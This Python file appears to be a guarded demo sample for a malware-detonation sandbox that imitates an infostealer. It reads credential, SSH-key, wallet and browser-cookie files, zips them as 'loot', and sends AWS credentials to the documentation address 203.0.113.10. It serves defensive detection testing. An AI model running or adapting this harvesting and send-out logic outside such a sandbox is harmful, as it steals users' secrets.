# Demo sample for Detonation Ocean. Refuses to run outside the sandbox.
import os
import socket
import sys
import tempfile
import zipfile

# Two conditions, both required: the sandbox marker, and a home directory that is the seeded one. Anything else exits here.
if os.environ.get("DETONATION_SANDBOX") != "1" or os.path.expanduser("~") != "/home/dana" or not os.path.isdir("/home/dana/Documents"):
    sys.exit(0)

home = "/home/dana"
# The honey files the seed profile plants; every value is synthetic and carries the per-job canary.
honeypots = (
    ".aws/credentials",
    ".ssh/id_ed25519",
    ".env",
    ".electrum/wallets/default_wallet",
    ".config/chromium/Default/Login Data",
    ".config/chromium/Default/Cookies",
)
documents = ("Documents/Q3-report.docx", "Documents/budget.xlsx", "Documents/notes.txt", "Documents/photos-list.csv")

harvest = {}
for relative in honeypots:
    try:
        with open(os.path.join(home, relative), "rb") as handle:
            harvest[relative] = handle.read()
    except OSError:
        continue

# Stage everything in one archive under /tmp, the way a stealer packs its loot before it uploads.
staged = os.path.join(tempfile.mkdtemp(prefix="harvest-", dir="/tmp"), "loot.zip")
with zipfile.ZipFile(staged, "w", zipfile.ZIP_DEFLATED) as archive:
    for name, data in harvest.items():
        archive.writestr(name.replace("/", "_"), data)
    for relative in documents:
        try:
            archive.write(os.path.join(home, relative), relative)
        except OSError:
            continue

# One short outbound attempt to a documentation address (RFC 5737, not routable). The sandbox has no network, so it is refused.
# The bytes sent are one file read into one buffer, which is how the trace attributes a socket write to what was read.
try:
    with open(os.path.join(home, ".aws/credentials"), "rb") as handle:
        payload = handle.read()
except OSError:
    payload = b""
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(3)
try:
    sock.connect(("203.0.113.10", 443))
except OSError:
    pass
# A separate attempt: with no network the connect is refused, and the send is still tried on the unconnected socket.
try:
    sock.sendall(payload)
except OSError:
    pass
sock.close()
